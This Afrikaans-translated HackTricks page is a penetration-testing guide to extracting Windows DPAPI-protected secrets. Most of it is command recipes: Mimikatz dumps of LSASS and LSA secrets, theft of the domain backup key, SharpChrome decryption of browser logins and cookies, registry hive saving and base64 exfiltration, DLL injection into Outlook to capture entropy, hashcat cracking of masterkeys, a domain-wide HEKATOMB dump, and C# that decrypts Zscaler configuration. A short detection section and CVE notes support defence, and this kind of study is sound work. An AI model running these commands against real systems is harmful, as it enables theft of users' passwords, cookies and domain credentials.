# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die **Windows**-bedryfstelsel gebruik vir die **simmetriese enkripsie van asimmetriese private sleutels**, deur óf gebruiker- óf stelselgeheime as 'n belangrike bron van entropie te gebruik. Hierdie benadering vereenvoudig enkripsie vir ontwikkelaars deur hulle in staat te stel om data te enkripteer met 'n sleutel wat van die gebruiker se aanmeldgeheime afgelei is of, vir stelselenkripsie, die stelsel se domeinverifikasiegeheime te gebruik. Dit skakel dus die behoefte uit vir ontwikkelaars om self die beskerming van die enkripsiesleutel te bestuur.

Die algemeenste manier om DPAPI te gebruik, is deur die **`CryptProtectData` en `CryptUnprotectData`**-funksies, wat toepassings toelaat om data te enkripteer en te dekripteer deur die sekuriteitskonteks van die tans aangemelde proses te gebruik. By verstek kan die data slegs gedekripteer word deur dieselfde gebruiker- of stelselkonteks wat dit geënkripteer het.<sup>[[2]](#references)[[3]](#references)</sup>

Hierdie funksies aanvaar ook 'n opsionele **entropieparameter** wat tydens enkripsie en dekripsie gebruik word. Data wat met opsionele entropie beskerm word, vereis dieselfde entropiewaarde vir dekripsie.<sup>[[2]](#references)[[6]](#references)</sup>

### Gebruikersleutelgenerering

DPAPI lei 'n gebruiker-spesifieke waarde (dikwels 'n **pre-key** genoem) van die gebruiker se geloofsbriewe af. Die presiese afleiding hang van die rekening en bedryfstelselweergawe af. Impacket probeer byvoorbeeld 'n HMAC-SHA1-pad gebaseer op die SHA-1-digest van die UTF-16LE-wagwoord, nog een gebaseer op die wagwoord se MD4/NT-hash, en 'n PBKDF2-SHA256-afgeleide pad vir Protected Users. Daarom kan offline nutsprogramme dikwels die vereiste materiaal uit óf die plaintext-wagwoord óf 'n beskikbare NT-hash aflei.<sup>[[2]](#references)[[10]](#references)</sup>

Dit is besonder interessant omdat 'n aanvaller, indien hulle die gebruiker se wagwoordhash kan bekom, die volgende kan doen:

- **Enige data dekripteer wat met DPAPI geënkripteer is** met daardie gebruiker se sleutel, sonder om enige API te kontak
- Probeer om die **wagwoord te crack** deur offline te probeer om die geldige DPAPI-sleutel te genereer

DPAPI handhaaf een of meer **master keys** vir elke gebruiker, eerder as om 'n nuwe master key vir elke beskermde blob te skep. Elke master key het 'n **GUID** (Globally Unique Identifier), en 'n geënkripteerde blob teken aan watter master key dit beskerm.<sup>[[2]](#references)</sup>

Master keys word in die **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**-gids gestoor, waar `{SID}` die gebruiker se Security Identifier is. Die master-key-lêer bevat materiaal wat deur die gebruiker se **pre-key** beskerm word en, vir domeingebruikers, herstelmateriaal wat deur 'n **domain backup key** beskerm word.<sup>[[2]](#references)</sup>

Let daarop dat die **domeinsleutel wat gebruik word om die master key te enkripteer in die domeinbeheerders is en nooit verander nie**. Indien 'n aanvaller dus toegang tot die domeinbeheerder het, kan hulle die domain backup key bekom en die master keys van alle gebruikers in die domein dekripteer.<sup>[[2]](#references)</sup>

Die geënkripteerde blobs bevat die **GUID van die master key** wat gebruik is om die data binne hul opskrifte te enkripteer.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Vind master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is hoe ’n klomp Master Keys van ’n gebruiker sal lyk:

![What is DPAPI - Users key generation: This is hoe ’n klomp Master Keys van ’n gebruiker sal lyk](<../../images/image (1121).png>)

### Machine/System key generation

Dit is die key wat deur die machine gebruik word om data te encrypt. Dit is gebaseer op die **DPAPI_SYSTEM LSA secret**, wat ’n spesiale key is waartoe slegs die SYSTEM user toegang het. Hierdie key word gebruik om data te encrypt wat deur die stelsel self toeganklik moet wees, soos machine-level credentials of system-wide secrets.<sup>[[2]](#references)</sup>

Let daarop dat hierdie keys **nie ’n domain backup het nie**, en dus slegs plaaslik accessible is:

- **Mimikatz** kan toegang daartoe verkry deur LSA secrets te dump met die command: `mimikatz lsadump::secrets`
- Die secret word binne die registry gestoor, dus kan ’n administrator die **DACL permissions wysig om toegang daartoe te verkry**. Die registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction from registry hives is ook moontlik. Byvoorbeeld, as ’n administrator op die target, save die hives en exfiltrate hulle:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Dan, op jou analysis box, herwin die DPAPI_SYSTEM LSA secret uit die hives en gebruik dit om machine-scope blobs te decrypt (scheduled task passwords, service credentials, Wi-Fi profiles, ens.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Data beskerm deur DPAPI

Van die persoonlike data wat deur DPAPI beskerm word, is:

- Windows creds
- Wagwoorde en outo-voltooiingsdata van Internet Explorer en Google Chrome
- E-pos- en interne FTP-rekeningwagwoorde vir toepassings soos Outlook en Windows Mail
- Wagwoorde vir gedeelde vouers, hulpbronne, wireless networks en Windows Vault, insluitend encryption keys
- Wagwoorde vir remote desktop connections, .NET Passport en private keys vir verskeie encryption- en authentication-doeleindes
- Network passwords wat deur Credential Manager bestuur word, asook persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger en meer
- Encrypted blobs binne die register
- ...

Stelselbeskermde data sluit in:
- Wifi-wagwoorde
- Wagwoorde vir geskeduleerde take
- ...

### Opsies vir master key extraction

- As die gebruiker domain admin-voorregte het, kan hulle toegang tot die **domain backup key** verkry om alle user master keys in die domain te decrypt:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Met plaaslike administrateurvoorregte is dit moontlik om toegang tot die **LSASS-geheue** te verkry om die DPAPI-hoofsleutels van alle aangemelde gebruikers en die SYSTEM-sleutel te onttrek.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- As die gebruiker plaaslike administrateurbevoegdhede het, kan hulle toegang tot die **DPAPI_SYSTEM LSA secret** verkry om die masjien-master keys te decrypt:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- As die gebruiker se wagwoord of NTLM-hash bekend is, kan jy die gebruiker se master keys direk **decrypt**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- As jy binne ’n session as die gebruiker is, is dit moontlik om die DC vir die **backup key te vra om die master keys met RPC te decrypt**. As jy local admin is en die gebruiker aangemeld is, kan jy sy **session token steel** om dit te doen:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lys Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kry toegang tot DPAPI-geënkripteerde data

### Vind DPAPI-geënkripteerde data

Algemene gebruikerslêers wat **beskerm word**, is in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kontroleer ook deur `\Roaming\` na `\Local\` in die bogenoemde paaie te verander.

Voorbeelde van enumerasie:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI encrypted blobs in die lêerstelsel, register en B64 blobs vind:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Let daarop dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (van dieselfde repo) gebruik kan word om sensitiewe data soos cookies met DPAPI te decrypt.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron vinnige resepte (SharpChrome)

- Huidige user, interactive decryption van gestoorde logins/cookies (werk selfs met Chrome 127+ app-bound cookies omdat die ekstra sleutel vanaf die user se Credential Manager opgelos word wanneer dit in user context uitgevoer word):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-analise wanneer jy slegs lêers het. Ekstraheer eers die AES state key uit die profiel se "Local State" en gebruik dit dan om die cookie DB te dekripteer:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domeinwye/remote triage wanneer jy die DPAPI-domein-rugsteunsleutel (PVK) en admin op die teikenhost het:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- As jy ’n gebruiker se DPAPI prekey/credkey (van LSASS) het, kan jy password cracking oorslaan en profieldata direk dekripteer:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notas
- Nuwer Chrome/Edge-bouweergawes kan sekere koekies met "App-Bound"-enkripsie stoor. Vanlyn-dekripsie van daardie spesifieke koekies is nie moontlik sonder die bykomende app-bound-sleutel nie; voer SharpChrome onder die teikengebruiker se konteks uit om dit outomaties te verkry. Sien die Chrome-sekuriteitsblogplasing waarna hieronder verwys word.<sup>[[5]](#references)</sup>

### Toegangssleutels en data

- **Gebruik SharpDPAPI** om geloofsbriewe uit DPAPI-geënkripteerde lêers van die huidige sessie te verkry:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kry credentials-inligting** soos die geënkripteerde data en die guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Dekripteer ’n masterkey van ’n gebruiker wat die **domain backup key** versoek deur RPC te gebruik:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Die **SharpDPAPI**-tool ondersteun ook hierdie argumente vir masterkey-decryption (let op dat dit moontlik is om `/rpc` te gebruik om die domein se backup key te kry, `/password` om ’n plaintext-wagwoord te gebruik, of `/pvk` om ’n DPAPI-domein-private sleutel-lêer te spesifiseer...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypteer data met behulp van 'n masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Die **SharpDPAPI**-tool ondersteun ook hierdie arguments vir `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (let daarop dat dit moontlik is om `/rpc` te gebruik om die domein se backup key te verkry, `/password` om ’n plaintext password te gebruik, `/pvk` om ’n DPAPI domain private key-lêer te spesifiseer, en `/unprotect` om die huidige gebruiker se session te gebruik...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Gebruik van ’n DPAPI prekey/credkey direk (geen password nodig nie)

As jy LSASS kan dump, stel Mimikatz dikwels ’n DPAPI key per logon bloot wat gebruik kan word om die gebruiker se masterkeys te decrypt sonder om die plaintext password te ken. Gee hierdie waarde direk aan die tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Dekripteer sommige data met die **huidige gebruikersessie**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption with Impacket dpapi.py

As jy die slagoffer se gebruiker se SID en wagwoord (of NT-hash) het, kan jy DPAPI-masterkeys en Credential Manager-blobs volledig offline dekripteer met Impacket se dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifiseer artefakte op skyf:
- Credential Manager-blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Ooreenstemmende masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- As file transfer tooling onbetroubaar is, base64 die lêers op die gasheer en kopieer die uitvoer:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Dekripteer die masterkey met die gebruiker se SID en password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Gebruik die gedekripteerde masterkey om die credential blob te dekripteer:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Hierdie workflow herwin dikwels domeincredentials wat deur apps met die Windows Credential Manager gestoor is, insluitend administratiewe rekeninge (bv. `*_adm`).

---

### Hantering van Optional Entropy ("Third-party entropy")

Sommige toepassings stuur ’n bykomende **entropy**-waarde na `CryptProtectData`. Sonder hierdie waarde kan die blob nie gedecrypt word nie, selfs al is die korrekte masterkey bekend. Die verkryging van die entropy is dus noodsaaklik wanneer credentials geteiken word wat op hierdie manier beskerm word (bv. Microsoft Outlook, sommige VPN-clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is ’n user-mode DLL wat die DPAPI-funksies binne die teikenproses hook en enige optional entropy wat verskaf word, deursigtig aanteken. Deur EntropyCapture in **DLL-injection**-modus teen prosesse soos `outlook.exe` of `vpnclient.exe` te laat loop, word ’n lêer uitgevoer wat elke entropy-buffer aan die oproepende proses en blob koppel. Die vasgelegde entropy kan later aan **SharpDPAPI** (`/entropy:`) of **Mimikatz** (`/entropy:<file>`) verskaf word om die data te decrypt.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking van masterkeys offline (Hashcat & DPAPISnoop)

Microsoft het ’n **context 3**-masterkey-formaat vanaf Windows 10 v1607 (2016) bekendgestel. `hashcat` v6.2.6 (Desember 2023) het hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) en **22102** (context 3) bygevoeg, wat GPU-versnelde cracking van gebruikerwagwoorde direk vanaf die masterkey-lêer moontlik maak. Aanvallers kan dus word-list- of brute-force attacks uitvoer sonder om met die teikenstelsel te interaksieer.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) outomatiseer die proses:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Die tool kan ook Credential- en Vault-blobs ontleed, dit met gekraakte sleutels dekripteer en cleartext-wagwoorde uitvoer.<sup>[[8]](#references)</sup>


### Kry toegang tot data op ander masjien

In **SharpDPAPI en SharpChrome** kan jy die **`/server:HOST`**-opsie aandui om toegang tot ’n afgeleë masjien se data te verkry. Natuurlik moet jy toegang tot daardie masjien hê, en in die volgende voorbeeld word aanvaar dat die **domein se rugsteunenkripsiesleutel bekend is**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ander tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is ’n tool wat die extraction van alle users en computers uit die LDAP-directory en die extraction van die domain controller backup key deur RPC outomatiseer. Die script sal dan alle computers se IP-adresse resolve en ’n smbclient op alle computers uitvoer om alle DPAPI blobs van alle users te retrieve en alles met die domain backup key te decrypt.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die computers list wat uit LDAP geëxtract is, kan jy elke subnetwerk vind, selfs al het jy dit nie geken nie!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan secrets wat deur DPAPI beskerm word, outomaties dump. Die 2.x-release het die volgende bekendgestel:<sup>[[9]](#references)</sup>

* Parallelle collection van blobs vanaf honderde hosts
* Parsing van **context 3** masterkeys en outomatiese Hashcat-cracking integration
* Support vir Chrome se "App-Bound"-encrypted cookies (sien volgende section)
* ’n Nuwe **`--snapshot`**-mode om endpoints herhaaldelik te poll en nuutgeskepte blobs te diff

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is ’n C#-parser vir masterkey/credential/vault-files wat Hashcat/JtR-formate kan output en opsioneel cracking outomaties kan invoke. Dit support machine- en user-masterkey-formate volledig tot en met Windows 11 24H1.<sup>[[8]](#references)</sup>


## Algemene detections

- Toegang tot files in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante directories.
- Veral vanaf ’n network share soos **C$** of **ADMIN$**.
- Gebruik van **Mimikatz**, **SharpDPAPI** of soortgelyke tooling om toegang tot LSASS-memory te verkry of masterkeys te dump.
- Event **4662**: *’n Operasie is op ’n object uitgevoer* – kan gekorreleer word met toegang tot die **`BCKUPKEY`**-object.
- Event **4673/4674** wanneer ’n process *SeTrustedCredManAccessPrivilege* (Credential Manager) request

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). ’n Attacker met network access kon ’n domain member mislei om ’n malicious DPAPI backup key te retrieve, wat decryption van user-masterkeys moontlik gemaak het. Dit is in die November 2023 cumulative update gepatch – administrators moet verseker dat DCs en workstations volledig gepatch is.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Julie 2024) het die legacy DPAPI-only protection vervang met ’n additional key wat onder die user se **Credential Manager** gestoor word. Offline decryption van cookies vereis nou beide die DPAPI-masterkey en die **GCM-wrapped app-bound key**. SharpChrome v2.3 en DonPAPI 2.x kan die ekstra key recover wanneer dit met user-context uitgevoer word.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector stoor verskeie configuration files onder `C:\ProgramData\Zscaler` (bv. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Elke file is encrypted met **DPAPI (Machine scope)**, maar die vendor voorsien **custom entropy** wat *at runtime bereken* word in plaas daarvan dat dit op die skyf gestoor word.<sup>[[1]](#references)</sup>

Die entropy word uit twee elements herbou:

1. ’n Hard-coded secret wat binne `ZSACredentialProvider.dll` ingebed is.
2. Die **SID** van die Windows-account waaraan die configuration behoort.

Die algoritme wat deur die DLL geïmplementeer word, is equivalent aan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Omdat die geheim ingebed is in ’n DLL wat vanaf die skyf gelees kan word, kan **enige plaaslike aanvaller met SYSTEM-regte die entropie vir enige SID hergenereer** en die blobs vanlyn dekripteer:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption lewer die volledige JSON-konfigurasie, insluitend elke **device posture check** en sy verwagte waarde – inligting wat baie waardevol is wanneer client-side bypasses probeer word.

> WENK: die ander encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) word met DPAPI **sonder** entropy (`16` zero bytes) beskerm. Hulle kan dus direk met `ProtectedData.Unprotect` decrypted word sodra SYSTEM privileges verkry is.

## References

- [1] [Synacktiv – Kan jy jou zero trust vertrou? Bypassing van Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Sekuriteitsanalise en dataherwinning in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lees van DPAPI Encrypted Secrets met Mimikatz en C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Verbetering van die sekuriteit van Chrome-cookies op Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Eenvoudige ekstraksie van DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6-vrystellingsnotas](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub-bewaarplek](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI-projekblad](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, en DPAPI decryption na DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Gebruik en opsies](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
